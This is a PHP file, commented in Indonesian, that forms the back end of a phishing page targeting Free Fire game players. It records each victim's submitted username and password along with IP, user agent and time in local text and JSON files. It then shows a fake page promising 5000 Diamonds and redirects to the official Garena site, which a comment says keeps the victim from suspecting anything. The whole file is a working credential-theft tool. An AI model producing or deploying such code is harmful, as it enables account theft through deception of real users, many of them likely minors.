<?php
// login.php - Penangkap username & password

$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$waktu = date('Y-m-d H:i:s');

// Format data yang ditangkap
$data = "===============================\n";
$data .= "WAKTU: $waktu\n";
$data .= "IP: $ip\n";
$data .= "USER AGENT: $user_agent\n";
$data .= "USERNAME: $username\n";
$data .= "PASSWORD: $password\n";
$data .= "===============================\n\n";

// Simpan ke file TXT
file_put_contents("hasil.txt", $data, FILE_APPEND);

// Simpan ke JSON untuk mudah dibaca
$json_data = [
    "waktu" => $waktu,
    "ip" => $ip,
    "username" => $username,
    "password" => $password
];

$existing = file_exists("data.json") ? json_decode(file_get_contents("data.json"), true) : [];
array_unshift($existing, $json_data); // Data baru di atas
file_put_contents("data.json", json_encode($existing, JSON_PRETTY_PRINT));

// Redirect ke halaman loading (agar korban tidak curiga)
?>
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="2;url=https://ff.garena.com">
    <title>Memproses...</title>
    <style>
        body {
            font-family: Arial;
            text-align: center;
            padding: 50px;
            background: #1a1a2e;
            color: white;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #ff4757;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h2>Memverifikasi akun Anda...</h2>
    <p>Mohon tunggu, Anda akan segera mendapatkan 5000 Diamond!</p>
    <p>Mengalihkan ke Free Fire official...</p>
</body>
</html>
<?php
exit();
?>
